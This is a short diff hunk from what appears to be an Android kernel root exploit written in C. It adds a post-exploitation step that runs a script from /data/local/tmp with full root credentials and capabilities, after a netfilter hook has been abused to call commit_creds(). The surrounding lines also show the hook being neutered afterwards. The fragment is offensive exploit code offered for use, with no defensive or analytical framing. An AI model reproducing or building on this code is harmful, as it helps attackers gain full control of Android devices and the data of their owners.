@@ -1138,6 +1138,22 @@ int main(int argc, char **argv)
 			close(pf);
 		}
 		LOG("[*] post-exploit complete; pausing (keep kctx alive)\n");
+		/* optional post-root script, run with the full init_cred caps
+		 * (a setuid su on Android gets uid 0 but *no* capabilities) */
+		if (access("/data/local/tmp/rootcmd.sh", R_OK) == 0) {
+			LOG("[*] running /data/local/tmp/rootcmd.sh\n");
+			pid_t c = fork();
+			if (c == 0) {
+				char *av[] = { (char *)"/system/bin/sh",
+					       (char *)"/data/local/tmp/rootcmd.sh", NULL };
+				char *ev[] = { (char *)"PATH=/sbin:/system/bin:/system/xbin", NULL };
+				execve("/system/bin/sh", av, ev);
+				_exit(127);
+			}
+			int st = 0;
+			waitpid(c, &st, 0);
+			LOG("[+] rootcmd.sh exit status=%d\n", st);
+		}
 		if (nf_reg >= 0) {
 			/* stop the hook from commit_creds()'ing every sender:
 			 * make the fake entry a benign NF_ACCEPT stub */
